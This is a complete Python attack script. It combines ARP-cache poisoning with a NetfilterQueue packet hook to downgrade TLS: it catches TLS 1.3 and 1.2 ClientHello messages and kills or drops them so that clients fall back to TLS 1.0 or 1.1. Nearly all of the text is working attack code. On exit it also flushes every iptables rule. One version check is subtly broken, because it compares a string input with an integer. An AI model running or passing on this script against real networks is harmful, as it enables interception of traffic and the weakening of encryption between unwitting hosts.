from netfilterqueue import NetfilterQueue
from scapy.all import *
import re
import os
import threading
import time

# All packets are filtered :
iptables = "iptables -I FORWARD -d 0.0.0.0/0 -j NFQUEUE --queue-num 1"

print("[+] Add iptable rule :")
print(iptables)
os.system(iptables)

print("[+] Set ipv4 forward settings : ")
os.system("sysctl net.ipv4.ip_forward=1")


def getMACAddr(IP):
	conf.verb = 0
	#srp() func is for sending packets and receiving answers(for layer 2 packet)
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.2)
	
	for snd,rcv in ans:
		return rcv.sprintf(r"%Ether.src%")


def restore():
	print ("\n[-] Restore poisoned targets")
	client_MAC = getMACAddr(client_IP)
	server_MAC = getMACAddr(server_IP)

	send(ARP(op = 2, pdst = server_IP, psrc = client_IP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = client_MAC), count = 3)	
	send(ARP(op = 2, pdst = client_IP, psrc = server_IP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = server_MAC), count = 3)

def callback(payload):
	global TLSver
	global TCPflag

	data = payload.get_payload()
	pkt = IP(data)
	
	proto = pkt[0].proto
	
	if (proto != 6): # 1:ICMP, 6:TCP, 17:UDP
		payload.accept()	

	elif re.search(b'\x16\x03.{3}\x01.{3}\x03\x03.',data,flags=0):
		if re.search(b'\x03\x04\x03\x03',data,flags=0):
			print("[i] "+ pkt[IP].src + " sends TLS 1.3 ClientHello(CH) to "+ pkt[IP].dst) 
			new_payload = IP(dst=pkt[IP].dst, src=pkt[IP].src)/TCP()
			new_payload[TCP].sport = pkt[TCP].sport
			new_payload[TCP].dport = pkt[TCP].dport
			new_payload[TCP].seq = pkt[TCP].seq 
			new_payload[TCP].ack = pkt[TCP].ack 

			if TCPflag == 'FA':
				new_payload[TCP].flags = 'FA'
			elif TCPflag == 'RA':
				new_payload[TCP].flags = 'RA'
			elif TCPflag == 'NONE':
				print("[i] Drop TLS 1.3 CH\n")
				payload.drop();
				return
			else:				
				new_payload[TCP].flags = 'FA'

			payload.set_payload(bytes(new_payload))	
			print("[i] Teriminate TLS 1.3 session\n")			
			payload.accept()

		else:
			print("[i] "+ pkt[IP].src + " sends TLS 1.2 ClientHello(CH) to "+ pkt[IP].dst) 
			if TLSver == 1:
				print("[i] Connect to server with TLS 1.2\n")	
				payload.accept()		
			
			else:
				new_payload = IP(dst=pkt[IP].dst, src=pkt[IP].src)/TCP()
				new_payload[TCP].sport = pkt[TCP].sport
				new_payload[TCP].dport = pkt[TCP].dport
				new_payload[TCP].seq = pkt[TCP].seq 
				new_payload[TCP].ack = pkt[TCP].ack 

				if TCPflag == 'FA':
					new_payload[TCP].flags = 'FA'
				elif TCPflag == 'RA':
					new_payload[TCP].flags = 'RA'
				elif TCPflag == 'NONE':
					print("[i] Drop TLS 1.2 CH\n")
					payload.drop();
					return
				else:				
					new_payload[TCP].flags = 'FA'

				print("[i] Teriminate TLS 1.2 session\n")
				payload.set_payload(bytes(new_payload))		
				payload.accept()	

	elif re.search(b'\x16\x03.{3}\x01.{3}\x03\x02',data,flags=0):
		print("[i] "+ pkt[IP].src + " sends TLS 1.1 ClientHello(CH) to "+ pkt[IP].dst) 
		print("[i] Connect to server with TLS 1.1\n")		
		payload.accept()		

	elif re.search(b'\x16\x03.{3}\x01.{3}\x03\x01',data,flags=0):
		print("[i] "+ pkt[IP].src + " sends TLS 1.0 ClientHello(CH) to "+ pkt[IP].dst) 
		print("[i] Connect to server with TLS 1.0\n")
		payload.accept()		
	
	else:
		payload.accept()
	
def mitm():
	q = NetfilterQueue()
	q.bind(1,callback)

	try:
		q.run()
	except KeyboardInterrupt:				
		print ("\n****************************")	
		restore()
		q.unbind()
		print("[-] Flushing iptables.")
		# This flushes everything, you might wanna be careful
		os.system("sysctl net.ipv4.ip_forward=0")
		os.system('iptables -F')
		os.system('iptables -X')
		
	
def poisoning():		
	curentThread = threading.currentThread()

	try:
		client_MAC = getMACAddr(client_IP)
	except Exception:
		print ("[-] Cannot find client MAC addr")
		curentThread.stop()

	try:
		server_MAC = getMACAddr(server_IP) 
	except Exception:
		print ("[-] Cannot find server MAC addr")
		curentThread.stop()

	print ("[+] Poisoning Targets")	
	print ("****************************\n")	
	
	while getattr(curentThread, "do_run", True):
		try:
			send(ARP(op = 2, pdst = client_IP, psrc = server_IP, hwdst= client_MAC))
			send(ARP(op = 2, pdst = server_IP, psrc = client_IP, hwdst= server_MAC))
			time.sleep(1)
		except KeyboardInterrupt:
			print ("[-] Stop to poisoning")	
			break


if __name__ == "__main__":
	global TLSver
	global TCPflag

	try:
		interface = input("[+] Network Interface: ")
		client_IP = input("[+] Enter Client IP: ")
		server_IP = input("[+] Enter Server IP: ")
		TCPflag = input("[+] Enter TCP terminating flag [FA(default)|RA|NONE]: ")
		TLSver = input("[+] Enter target TLS version [1(TLSv1.2)|2(default,Before TLSv1.2)]: ")

	except KeyboardInterrupt:
		print ("\n[-] Interrupted, Exit")
		sys.exit(1)
	
	thread = threading.Thread(target=poisoning, args=())
	thread.start()

	mitm()

	thread.do_run = False
	thread.join()			
	
